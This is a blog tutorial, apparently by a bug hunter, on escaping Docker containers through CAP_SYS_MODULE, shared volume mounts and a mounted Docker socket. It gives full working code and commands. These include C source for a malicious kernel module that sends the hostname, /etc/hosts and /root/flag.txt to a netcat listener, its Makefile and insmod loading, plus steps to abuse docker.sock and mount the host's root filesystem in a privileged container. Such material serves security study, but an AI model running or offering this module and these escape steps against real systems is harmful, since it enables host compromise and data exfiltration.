# Page 1

In this blog, I will go through some common techniques that can allow an attacker to escape a Docker container.

I learned these techniques while hunting on a target that allowed me to run Python scripts in an isolated environment. I tried to escape the container, but unfortunately, I was not able to do it because the target was very secure.

However, during my research, I learned several interesting techniques that I think can be useful to share. In this blog, I will document what I learned and explain the different Docker escape techniques I explored.



### **Escaping the Container with CAP\_SYS\_MODULE**

Before attempting this technique, we need to enumerate the container and verify that several requirements are met.

The following conditions are required:

* We must have **root privileges inside the container**.
*   The container must have the **`CAP_SYS_MODULE`** capability. Privileged containers usually have this capability. To check the current capabilities, run:

    ```bash
    cat /proc/self/status | grep -i cap
    ```

    Then decode the `CapEff` value:

    ```bash
    capsh --decode="CapEff output"
    ```

    We should see `cap_sys_module` in the output.
*   **Kernel module loading must be enabled.** We can check this with:

    ```bash
    cat /proc/sys/kernel/modules_disabled
    ```

    A value of `0` means that kernel module loading has not been disabled.
*   **Kernel module signature enforcement must not block unsigned modules.** We can check the `sig_enforce` parameter with:

    ```bash
    cat /sys/module/module/parameters/sig_enforce
    ```

    If the output is `N`, unsigned kernel modules are not being strictly enforced by this setting.

#### Example

<figure><img src=".gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

**Exploit: Creating a Malicious Kernel Module**

Once all the required conditions are met, we can create a malicious kernel module and compile it using a `Makefile`.

The following kernel module executes a command when it is loaded:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tejas Jaiswal");
MODULE_DESCRIPTION("Kernel module to exfiltrate system data with clean output");

static int __init exfil_init(void) {
    printk(KERN_INFO "[+] Exfiltration Module Loaded\n");

    char *argv[] = {
        "/bin/bash",
        "-c",
        "(echo '[+] Hostname:'; hostname; echo ''; "
        "echo '[+] UID Info:'; head /etc/hosts; echo ''; "
        "echo '[+] /flag (first 5 lines):'; cat /root/flag.txt; echo '' ) | nc IP PORT",
        NULL
    };

    static char *envp[] = {
        "HOME=/root",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
    return 0;
}

static void __exit exfil_exit(void) {
    printk(KERN_INFO "[-] Exfiltration Module Unloaded\n");
}

module_init(exfil_init);
module_exit(exfil_exit);
```

#### Makefile

We also need a `Makefile` to compile the kernel module:

```makefile
obj-m += Malicious.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Run `make` to compile the module and generate the `.ko` file:

```bash
make
```

If the compilation is successful, we should have a file such as:

```
Malicious.ko
```

#### Loading the Kernel Module

We can then load the module using `insmod`:

```bash
insmod Malicious.ko
```

If everything is configured correctly, the module will be loaded and its initialization function will execute.

> **Note:** If you run into problems and need to remove the loaded module, you can use `rmmod` with the module name. To remove the generated build files, run `make clean`.

<figure><img src=".gitbook/assets/Screenshot 2026-09-22 160303 - Copy.png" alt=""><figcaption></figcaption></figure>





### **Docker Shared Directories**

When using Docker, shared directories (volume mounts) can create a connection between the host system and the container's filesystem. With shared directories, specific directories or files from the host can be made accessible inside the container.

However, the security impact depends on how the environment is configured and which folder is mounted. During privilege escalation, we should check whether the mounted folder contains sensitive files or can be used to gain higher privileges on the host.

It's important to note that shared directories can be mounted as either read-only or read-write, depending on the administrator's requirements. When a directory is mounted as read-only, modifications made inside the container cannot affect the files on the host.

```bash
docker run -it --name mounted_container -v /home:/hostsystem/home ubuntu:latest /bin/bash
```

But what if the `john` user's home directory contains an SSH private key? If the container has access to that directory, the key may become accessible from inside the container. In a misconfigured environment, this could potentially allow an attacker to use the key to authenticate as `john` on the host.

#### Enumeration & Exploitation

**Look for Non-Standard Directories**

Once we have a shell inside a container, we can start by listing the contents of the root directory (`/`). Most Linux systems contain standard directories such as `/bin`, `/etc`, `/home`, and `/usr`. We should look for directories that seem unusual or that may contain files from the host system.

Common names for shared directories include `/mnt`, `/host`, `/data`, or descriptive names such as

<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

Here, `/hostsystem` looks interesting because it is not normally present in a standard container filesystem.

**Investigate Suspicious Directories**

If we find a directory that looks like it could be a shared directory, we should investigate its contents:

We can then search for sensitive files. For example, SSH keys are interesting because a private key may allow authentication as the corresponding user:



### **Docker Sockets**

A Docker socket is a special file that allows processes to communicate with the Docker daemon. On Linux, the Docker daemon commonly uses a Unix socket such as `/var/run/docker.sock`.

When we run a command with the Docker CLI, the client communicates with the Docker daemon through this socket. The daemon then performs the requested action, such as creating, starting, or managing containers.

Access to the Docker socket is normally restricted because it provides significant control over the Docker daemon. However, if a user or process inside a container can access the Docker socket, this can become a serious security issue.

If `/var/run/docker.sock` is mounted inside a container, processes inside that container may be able to communicate directly with the Docker daemon on the host.

#### Steps to Exploit

**Step 1 — Check for the Docker Socket**

First, we need to check whether the Docker socket is available inside the container:

```bash
find / -name "docker.sock" 2>/dev/null
```

Next, we should check the permissions of the socket:

```bash
ls -lha /run/docker.sock
srw-rw---- 1 root docker 0 Sep 22 15:56 /run/docker.sock
```

<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Because our user is a member of the `docker` group, we have permission to interact with the Docker socket.

**Step 2 — Get a Docker Client**

If the Docker client is not available inside the container, we can download one:

```bash
wget -O /tmp/docker https://master.dockerproject.com/linux/x86_64/docker
chmod +x /tmp/docker
```

**Step 3 — Interact with the Docker Socket**

Now we can use the downloaded Docker client to communicate with the Docker daemon through the socket.

The `-H` option specifies which Docker socket the client should use.

A good first command is `ps`, which allows us to check whether we can list the running containers:

```bash
/tmp/docker -H unix:///run/docker.sock ps
```

If the command works, we have successfully communicated with the Docker daemon through the socket.

**Step 4 — Perform the Container Escape**

If we have sufficient access to the Docker daemon, we can ask it to create a new privileged container and mount the host's root filesystem inside it.

```bash
/tmp/docker -H unix:///run/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu bash
```

Let's break down the command:

* `/tmp/docker -H unix:///run/docker.sock` — Use the downloaded Docker client and communicate with the Docker daemon through the socket.
* `run` — Create and start a new container.
* `--rm` — Automatically remove the container when we exit.
* `-it` — Start an interactive terminal.
* `--privileged` — Give the new container extended privileges.
* `-v /:/hostsystem` — Mount the host's root filesystem (`/`) to `/hostsystem` inside the new container.
* `ubuntu bash` — Use the Ubuntu image and start a Bash shell.

**Step 5 — Access the Host Filesystem**

After starting the new container, we can check the mounted filesystem:

```bash
root@new-container:/# ls /hostsystem/
```

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>





